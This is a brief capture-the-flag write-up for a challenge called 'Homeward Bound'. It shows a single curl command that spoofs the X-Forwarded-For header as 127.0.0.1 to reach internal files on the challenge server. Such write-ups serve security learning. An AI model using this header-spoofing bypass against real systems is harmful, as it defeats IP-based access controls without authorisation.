## Homeward Bound

In this challenge we were supposed to access internal files by spoofing client IP address, this can be done using `X-Forwarded-For` header

```
$ curl -H “X-Forwarded-For: 127.0.0.1” http://challenge.nahamcon.com:31428/
```
